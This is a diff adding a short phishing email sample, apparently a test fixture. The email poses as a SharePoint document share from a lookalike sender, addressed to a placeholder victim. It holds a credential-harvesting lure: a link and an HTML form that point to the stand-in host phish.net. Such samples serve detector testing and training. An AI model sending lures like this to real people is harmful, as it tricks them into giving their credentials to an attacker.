@@ -1,0 +1,6 @@
+Subject: Secure Document Shared
+From: no-reply@sharepoint-secure-doc.com
+To: victim@company.com
+
+Login to continue to view the secure document. <a href='http://phish.net/login'>Click here</a> to verify your account.
+<form action='http://phish.net/auth' type='password'></form>
